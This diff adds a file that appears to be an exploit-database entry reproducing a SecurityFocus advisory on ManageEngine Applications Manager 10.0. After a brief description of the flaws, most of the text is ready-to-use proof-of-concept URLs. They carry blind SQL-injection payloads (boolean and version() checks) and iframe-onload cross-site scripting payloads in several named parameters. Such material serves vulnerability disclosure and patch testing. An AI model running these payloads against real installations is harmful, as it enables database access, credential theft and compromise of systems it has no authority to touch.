@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/54759/info
+
+ManageEngine Applications Manager is prone to multiple SQL-injection and multiple cross-site scripting vulnerabilities.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+ManageEngine Applications Manager 10.0 is vulnerable; prior versions may also be affected. 
+
+http://www.example.com/MyPage.do?method=viewDashBoard&forpage=1&addNewTab=true&selectedpageid=10000017+AND+1=1--%20-[BLIND SQL-INJECTION]
+
+http://www.example.com/jsp/RCA.jsp?resourceid=10000624&attributeid=1900&alertconfigurl=%2FshowActionProfiles.do%3Fmethod%3DgetResourceProfiles%26admin%3Dtrue%26all%3Dtrue%26resourceid%3D-10000624'+AND+substring(version(),1)=4
+[BLIND SQL-INJECTION]&Sat%20Jun%2023%202012%2000:47:25%20GMT+0200%20(EET)
+
+http://www.example.com/showCustom.do?resourcename=null&type=EC2Instance&original_type=EC2Instance&name=&moname=i-3a96b773&tabId=1&baseid=10000015&resourceid=10000744&monitorname=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C&method=showDataforConfs
+
+http://www.example.com/MyPage.do?method=viewDashBoard&forpage=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C&addNewTab=true&selectedpageid=10000014
+
+http://www.example.com/jsp/ThresholdActionConfiguration.jsp?resourceid=10000055&attributeIDs=101&attributeToSelect=101&redirectto=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C
+
+http://www.example.com/showresource.do?resourceid=10000189&type=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C&moname=DNS+monitor&method=showdetails&resourcename=DNS+monitor&viewType=showResourceTypes
+
+http://www.example.com/jsp/ThresholdActionConfiguration.jsp?resourceid=10000055&attributeIDs=101&attributeToSelect=101%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C&redirectto=/common/serverinfo.do
+
+http://www.example.com/ProcessTemplates.do?method=createProcessTemplate&templatetype=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C
